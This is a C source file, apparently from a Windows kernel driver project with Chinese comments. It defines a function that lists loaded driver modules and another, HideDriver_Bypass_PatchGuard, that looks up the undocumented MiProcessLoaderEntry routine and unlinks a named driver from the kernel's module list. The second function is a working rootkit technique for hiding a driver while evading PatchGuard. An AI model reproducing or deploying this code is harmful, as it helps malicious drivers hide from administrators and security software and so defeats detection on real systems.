#include "EnumDriver.h"
#include "GetMiProcessLoaderEntry.h"


// 驱动模块遍历
BOOLEAN EnumDriver(PDRIVER_OBJECT pDriverObject)
{
	// 从PDRIVER_OBJECT获取DriverSection，便可获得驱动模块链表
	PLDR_DATA_TABLE_ENTRY pDriverData = (PLDR_DATA_TABLE_ENTRY)pDriverObject->DriverSection;
	// 开始遍历双向链表
	PLDR_DATA_TABLE_ENTRY pFirstDriverData = pDriverData;
	do
	{
		if ((0 < pDriverData->BaseDllName.Length) ||
			(0 < pDriverData->FullDllName.Length))
		{
			// 显示
			DbgPrint("BaseDllName=%ws,\tDllBase=0x%p,\tSizeOfImage=0x%X,\tFullDllName=%ws\n",
				pDriverData->BaseDllName.Buffer, pDriverData->DllBase,
				pDriverData->SizeOfImage, pDriverData->FullDllName.Buffer);
		}
		// 下一个
		pDriverData = (PLDR_DATA_TABLE_ENTRY)pDriverData->InLoadOrderLinks.Flink;

	} while (pFirstDriverData != pDriverData);

	return TRUE;
}


// 驱动模块隐藏(Bypass Patch Guard)
BOOLEAN HideDriver_Bypass_PatchGuard(PDRIVER_OBJECT pDriverObject, UNICODE_STRING ustrHideDriverName)
{
	// 从PDRIVER_OBJECT获取DriverSection，便可获得驱动模块链表
	PLDR_DATA_TABLE_ENTRY pDriverData = (PLDR_DATA_TABLE_ENTRY)pDriverObject->DriverSection;
	typedef_MiProcessLoaderEntry MiProcessLoaderEntry = NULL;

	// 获取 MiProcessLoaderEntry 函数地址
	MiProcessLoaderEntry = GetFuncAddr_MiProcessLoaderEntry();
	if (NULL == MiProcessLoaderEntry)
	{
		DbgPrint("GetFuncAddr_MiProcessLoaderEntry Error!");
		return FALSE;
	}
	DbgPrint("MiProcessLoaderEntry=0x%p", MiProcessLoaderEntry);

	// 开始遍历双向链表
	PLDR_DATA_TABLE_ENTRY pFirstDriverData = pDriverData;
	do
	{
		if ((0 < pDriverData->BaseDllName.Length) ||
			(0 < pDriverData->FullDllName.Length))
		{
			// 判断是否为隐藏的驱动模块
			if (RtlEqualUnicodeString(&pDriverData->BaseDllName, &ustrHideDriverName, TRUE))
			{
				// 摘链隐藏(Bypass Patch Guard)
				MiProcessLoaderEntry((PVOID)pDriverData, FALSE);
				DbgPrint("[Hide Driver]%wZ\n", &pDriverData->BaseDllName);
				break;
			}
		}
		// 下一个
		pDriverData = (PLDR_DATA_TABLE_ENTRY)pDriverData->InLoadOrderLinks.Flink;

	} while (pFirstDriverData != pDriverData);
	
	return TRUE;
}



